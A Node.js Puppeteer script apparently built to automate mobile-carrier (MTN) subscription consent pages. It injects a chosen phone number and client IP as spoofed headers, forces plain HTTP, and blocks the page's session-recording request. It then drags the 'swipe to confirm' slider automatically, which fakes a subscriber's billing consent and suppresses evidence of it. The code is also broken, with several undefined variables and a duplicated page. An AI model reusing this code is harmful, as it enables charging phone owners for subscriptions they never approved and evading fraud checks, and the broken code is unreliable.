const { getBrowser } = require("./browsermanager");

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

/**
 * Block only the session-recording request:
 *
 * /save-recording?sc=nigeria
 *
 * This version does NOT use Chrome CDP, so it works
 * with your Firefox-based browsermanager.
 */

function forceHttp(url) {
    if (!url) return url;

    return url.replace(/^https:\/\//i, "http://");
}
async function blockSessionRecording(page) {
    try {
        await page.setRequestInterception(true);

        page.on("request", (request) => {
            const url = request.url();

            if (
                url.includes("/save-recording") &&
                url.includes("sc=nigeria")
            ) {
                console.log(
                    "🚫 Blocked session recording:",
                    url
                );

                request.abort("blockedbyclient");
                return;
            }

            request.continue();
        });

        console.log(
            "🚫 Session recording blocking enabled"
        );
    } catch (error) {
        console.error(
            "❌ Failed to enable request blocking:",
            error.message
        );

        throw error;
    }
}

/**
 * Open MTN consent pages
 */
const clickConfirmButton = async ({
    origin,
    msisdn,
    client_ip,
    transactionId,
    headers
}) => {
    let page;

    try {
        const browser = await getBrowser();

        page = await browser.newPage();

        await page.setViewport({
            width: 1280,
            height: 600,
        });

        /*
         * Block session-recording requests
         */
        await blockSessionRecording(page);

        /*
         * HTTP headers
         */
        const finalTransactionId =
            transactionId ||
            String(
                Math.floor(
                    1000000000000000 +
                    Math.random() * 9000000000000000
                )
            );

        /*
         * MSISDN from parameter first,
         * then received header.
         */
        const finalMsisdn =
            msisdn ||
            headers?.["msisdn"] ||
            "";

        /*
         * Client IP from parameter first,
         * then received headers.
         */
        const finalClientIp =
            client_ip ||
            headers?.["x-real-ip"] ||
            headers?.["x-forwarded-for"] ||
            "";

        /*
         * Main page
         */
        page = await browser.newPage();

        await page.setViewport({
            width: 1280,
            height: 600,
        });

        await blockSessionRecording(page);

        /*
         * Use received headers.
         */
        await page.setExtraHTTPHeaders({
            ...headers,

            "x-real-ip":
                finalClientIp,

            "x-forwarded-for":
                finalClientIp,

            "x-forwarded-proto":
                headers?.["x-forwarded-proto"] ||
                "http",

            "upgrade-insecure-requests":
                headers?.["upgrade-insecure-requests"] ||
                "1",

            "accept":
                headers?.["accept"] ||
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

            "accept-language":
                headers?.["accept-language"] ||
                "en-US,en;q=0.9",

            "accept-encoding":
                headers?.["accept-encoding"] ||
                "gzip, deflate",

            "msisdn":
                finalMsisdn,
        });

        /*
         * Android Edge User-Agent
         */
        await page.setUserAgent(
            "Mozilla/5.0 (Linux; Android 10; K) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/153.0.0.0 Mobile Safari/537.36 " +
            "EdgA/153.0.0.0"
        );

        console.log(
            "🌐 Origin:",
            origin
        );

        console.log(
            "🌐 Client IP:",
            finalClientIp
        );

        console.log(
            "📱 MSISDN:",
            finalMsisdn
        );

        console.log(
            "🆔 Transaction ID:",
            finalTransactionId
        );

        /*
         * ONE URL ONLY
         *
         * Received MSISDN and transaction ID
         * are inserted into the URL.
         */
        const consentUrl =
            "http://102.133.198.92/Redirect" +
            "?OfferCode=9916710032" +
            `&mobileNumber=${encodeURIComponent(finalMsisdn)}` +
            "&redirectUrl=http%3A%2F%2Fmobile.arenaxpro.com%2Fredirect" +
            `&transactionID=${encodeURIComponent(finalTransactionId)}`;
        /*
         * Open every consent page in its own tab
         */
        
            try {
                await consentPage.setViewport({
                    width: 1280,
                    height: 900,
                });

                /*
                 * IMPORTANT:
                 *
                 * Enable request interception BEFORE goto().
                 *
                 * This prevents:
                 *
                 * POST /save-recording?sc=nigeria
                 *
                 * from being sent.
                 */
                await blockSessionRecording(
                    consentPage
                );

                /*
                 * HTTP headers
                 */
                await consentPage.setExtraHTTPHeaders({
                    "x-real-ip":
                       finalClientIp,

                    "x-forwarded-for":
                        finalClientIp,

                    "x-forwarded-proto":
                        "http",

                    "upgrade-insecure-requests":
                        "1",

                    "accept":
                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

                    "accept-language":
                        "en-US,en;q=0.9",

                    "accept-encoding":
                        "gzip, deflate",

                    "msisdn":
                        finalMsisdn,
                });

                /*
                 * Android Edge User-Agent
                 */
                await consentPage.setUserAgent(
                    "Mozilla/5.0 (Linux; Android 10; K) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/153.0.0.0 Mobile Safari/537.36 " +
                    "EdgA/153.0.0.0"
                );

                console.log("");
                console.log(
                    "======================================"
                );

                console.log(
                    `🌐 Opening ${item.name}`
                );

                console.log(
                    "======================================"
                );

                console.log(
                    "URL:",
                    consentUrl
                );

                /*
                 * Open page
                 */
                const httpUrl = forceHttp(consentUrl);

                console.log("🔄 Original URL:", item.url);
                console.log("🌐 HTTP URL:", httpUrl);

                await consentPage.goto(httpUrl, {
                    waitUntil: "domcontentloaded",
                    timeout: 30000,
                });

                await sleep(2000);
                const sliderSuccess = await swipeToConfirm(consentPage);

                if (sliderSuccess) {
                    console.log("✅ Slider completed successfully");
                    console.log("⏳ Waiting 10 seconds before closing browser...");

                    await sleep(10000);

                    console.log("🔴 Closing browser...");

                    await browser.close();

                    console.log("✅ Browser closed");

                    return {
                        success: true,
                        message: "Slider completed and browser closed after 10 seconds",
                    };
                }

                console.log("⚠️ Slider was not completed");
                console.log(
                    `✅ ${item.name} loaded`
                );

                console.log(
                    `📍 URL: ${consentPage.url()}`
                );

                console.log(
                    `📄 Title: ${await consentPage.title()}`
                );

                /*
                 * Check page elements
                 */
                const pageInfo =
                    await consentPage.evaluate(() => ({
                        hasMsisdn:
                            !!document.querySelector(
                                "input[name='msisdn']"
                            ),

                        hasSendOtp:
                            !!document.querySelector(
                                ".otpBtn"
                            ),

                        hasOtp:
                            !!document.querySelector(
                                "#otp"
                            ),

                        hasRegister:
                            !!document.querySelector(
                                "#registerServiceForm button"
                            ),
                    }));

                

            } catch (error) {
                console.error("");
                console.error(
                    `❌ ${item.name} failed`
                );

                console.error(
                    "Message:",
                    error?.message || error
                );

                if (error?.stack) {
                    console.error(
                        "Stack:",
                        error.stack
                    );
                }
            }
        

        /*
         * Keep tabs open for manual authorized interaction
         */
        console.log("");

        console.log(
            "⏸️ All consent pages are open for manual user interaction."
        );

        /*
         * Keep browser open for 60 seconds
         */
        await sleep(6000);

        return {
            success: true,

            opened:
                consentUrls.map(
                    (item) => item.name
                ),
        };

    } catch (err) {
        console.error("");
        console.error(
            "❌ Automation failed"
        );

        console.error(
            "Message:",
            err?.message || err
        );

        if (err?.stack) {
            console.error(
                "Stack:",
                err.stack
            );
        }

        if (page) {
            try {
                await page.close();
            } catch (_) {}
        }

        return {
            success: false,
            error:
                err?.message ||
                String(err),
        };
    }
};

async function swipeToConfirm(page) {
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
    try {
        await page.waitForSelector("#container", { visible: true, timeout: 10000 });
        await page.waitForSelector("#button", { visible: true, timeout: 10000 });

        const container = await page.$("#container");
        const button = await page.$("#button");

        const containerBox = await container.boundingBox();
        const buttonBox = await button.boundingBox();

        if (!containerBox || !buttonBox) {
            throw new Error("Slider coordinates not available");
        }

        const startX = buttonBox.x + buttonBox.width / 2;
        const startY = buttonBox.y + buttonBox.height / 2;

        // Overshoot the right edge so the slider clamps to exactly 100%
        const endX = containerBox.x + containerBox.width + 30;

        console.log(`➡️ Start: ${startX}, ${startY}`);
        console.log(`➡️ End:   ${endX}, ${startY}`);

        await page.mouse.move(startX, startY);
        await sleep(100);
        await page.mouse.down();
        await sleep(100);

        // Smooth drag with many steps so every handler sees the movement
        await page.mouse.move(endX, startY, { steps: 40 });

        // Hold at the end so the slider registers 100% before release
        await sleep(300);
        await page.mouse.move(endX, startY); // one extra move to be safe
        await sleep(150);

        await page.mouse.up();

        // Give the page time to run its "confirmed" logic
        await sleep(500);

        // Verify the handle really stayed at the end
        const after = await button.boundingBox();
        const maxX = containerBox.x + containerBox.width - buttonBox.width;
        const atEnd = after && after.x >= maxX - 5;

        console.log(atEnd ? "✅ Slider stopped at 100%" : "⚠️ Slider did not stay at the end");
        return atEnd;

    } catch (error) {
        console.error("❌ Slider error:", error.message);
        return false;
    }
}

module.exports = clickConfirmButton;